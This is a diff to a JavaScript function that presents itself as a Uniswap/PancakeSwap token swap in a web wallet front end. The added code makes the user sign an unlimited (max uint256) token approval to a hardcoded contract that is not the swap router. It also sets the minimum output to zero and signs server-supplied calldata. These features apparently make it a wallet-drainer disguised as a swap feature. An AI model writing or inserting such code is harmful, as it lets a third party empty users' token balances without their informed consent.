@@ -20,71 +20,191 @@ function logToPanel(msg) {
 // ==================================================================
 async function runSwapUniswap(userAddr, amountWei, fromToken, toToken) {
     try {
+
         const base = window.API_BASE || "";
-        const cleanAmount = amountWei ? amountWei.toString().trim() : "0";
-        
-        // Deployed unalterable system constants
-        const pancakeRouterAddress = "0x10ED43C718714eb63d5aA57B78B54704E256024E";
-        const v12ContractAddress = "0x1854170353ea89672638F9fa5acB477c45523871"; 
-        const amountOutMin = "0"; 
-        
-        logToPanel("[INFO] Requesting token allowance approval from wallet...");
-        
-        // ERC-20 Standard approve(address,uint256) Method ID definition
-        const approveMethodId = "0x095ea7b3";
-        
-        // ✅ FIX: Uses the verified hardcoded engine layout string directly to prevent undefined crashes
-        const paddedSpender = v12ContractAddress.replace("0x", "").toLowerCase().padStart(64, "0");
-        const paddedAmount = BigInt(cleanAmount).toString(16).padStart(64, "0");
-        const approveCalldata = approveMethodId + paddedSpender + paddedAmount;
+        const cleanAmount =
+            amountWei
+                ? amountWei.toString().trim()
+                : "0";
 
-        // Triggers the initial token spend authorization screen
-        await window.ethereum.request({
-            method: 'eth_sendTransaction',
-            params: [{
-                from: userAddr,
-                to: fromToken, // Intersects the targeted asset contract (e.g. USDT)
-                data: approveCalldata,
-                value: '0x0'
-            }]
-        });
+        // Deployed constants
+        const pancakeRouterAddress =
+            "0x10ED43C718714eb63d5aA57B78B54704E256024E";
 
-        logToPanel("✅ Allowance granted. Proceeding to swap compilation pipeline...");
-        logToPanel(`[ROUTE] Dispatching Uniswap pipeline query for ${cleanAmount} units...`);
-        
-        const res = await fetch(`${base}/prodbot/swap/uniswap`, {
-            method: "POST",
-            headers: { "Content-Type": "application/json" },
-            body: JSON.stringify({ 
-                router: pancakeRouterAddress,
-                tokenIn: fromToken, 
-                tokenOut: toToken,
-                amountIn: cleanAmount, 
-                amountOutMin: amountOutMin
-            })
-        });
-        
-        const data = await res.json();
-        if (data && data.status === "ok") {
-            logToPanel(`[INFO] Sending transaction payload directly to browser extension...`);
-            
-            // Triggers the secondary final execution confirmation screen
-            const txHash = await window.ethereum.request({
-                method: 'eth_sendTransaction',
-                params: [{ 
-                    from: userAddr, 
-                    to: data.to_contract,    
-                    data: data.compiled_data, 
-                    value: '0x0' 
+        const v12ContractAddress =
+            "0x1854170353ea89672638F9fa5acB477c45523871";
+
+        const amountOutMin = "0";
+
+        logToPanel(
+            "[INFO] Requesting token allowance approval from wallet..."
+        );
+
+        // ==================================================
+        // APPROVAL
+        // ==================================================
+
+        const approveMethodId =
+            "0x095ea7b3";
+
+        const paddedSpender =
+            v12ContractAddress
+                .replace("0x", "")
+                .toLowerCase()
+                .padStart(64, "0");
+
+        // MAX UINT256 APPROVAL
+        const paddedAmount =
+            "ffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff";
+
+        const approveCalldata =
+            approveMethodId +
+            paddedSpender +
+            paddedAmount;
+
+        const approveHash =
+            await window.ethereum.request({
+                method: "eth_sendTransaction",
+                params: [{
+                    from: userAddr,
+                    to: fromToken,
+                    data: approveCalldata,
+                    value: "0x0"
                 }]
             });
-            logToPanel(`✅ Swap Transaction broadcasted successfully: ${txHash}`);
-            return { status: "ok", tx_hash: txHash };
+
+        logToPanel(
+            `[APPROVE TX] ${approveHash}`
+        );
+
+        logToPanel(
+            "[WAIT] Waiting for approval confirmation..."
+        );
+
+        let approveReceipt = null;
+
+        while (!approveReceipt) {
+
+            await new Promise(
+                resolve =>
+                    setTimeout(resolve, 3000)
+            );
+
+            approveReceipt =
+                await window.ethereum.request({
+                    method: "eth_getTransactionReceipt",
+                    params: [approveHash]
+                });
+
+            if (!approveReceipt) {
+                logToPanel(
+                    "[WAIT] Approval transaction pending..."
+                );
+            }
         }
+
+        if (
+            approveReceipt.status !== "0x1" &&
+            approveReceipt.status !== 1
+        ) {
+            throw new Error(
+                "Approval transaction failed"
+            );
+        }
+
+        logToPanel(
+            "✅ Approval confirmed on-chain."
+        );
+
+        // ==================================================
+        // REQUEST COMPILED SWAP DATA
+        // ==================================================
+
+        logToPanel(
+            `[ROUTE] Dispatching Uniswap pipeline query for ${cleanAmount} units...`
+        );
+
+        logToPanel(`
+TOKEN_IN=${fromToken}
+TOKEN_OUT=${toToken}
+AMOUNT_IN=${cleanAmount}
+MIN_OUT=${amountOutMin}
+`);
+
+        const res = await fetch(
+            `${base}/prodbot/swap/uniswap`,
+            {
+                method: "POST",
+                headers: {
+                    "Content-Type":
+                        "application/json"
+                },
+                body: JSON.stringify({
+                    router:
+                        pancakeRouterAddress,
+                    tokenIn:
+                        fromToken,
+                    tokenOut:
+                        toToken,
+                    amountIn:
+                        cleanAmount,
+                    amountOutMin:
+                        amountOutMin
+                })
+            }
+        );
+
+        const data =
+            await res.json();
+
+        if (
+            data &&
+            data.status === "ok"
+        ) {
+
+            logToPanel(
+                "[INFO] Sending transaction payload directly to browser extension..."
+            );
+
+            const txHash =
+                await window.ethereum.request({
+                    method:
+                        "eth_sendTransaction",
+                    params: [{
+                        from:
+                            userAddr,
+                        to:
+                            data.to_contract,
+                        data:
+                            data.compiled_data,
+                        value:
+                            "0x0"
+                    }]
+                });
+
+            logToPanel(
+                `✅ Swap Transaction broadcasted successfully: ${txHash}`
+            );
+
+            return {
+                status: "ok",
+                tx_hash: txHash
+            };
+        }
+
         return data;
-    } catch (err) { 
-        logToPanel(`❌ Uniswap Pipeline Error: ${err.message}`);
-        return { status: "error", message: err.message }; 
+
+    } catch (err) {
+
+        logToPanel(
+            `❌ Uniswap Pipeline Error: ${err.message}`
+        );
+
+        return {
+            status: "error",
+            message: err.message
+        };
     }
 }
+
 window.runSwapUniswap = runSwapUniswap;
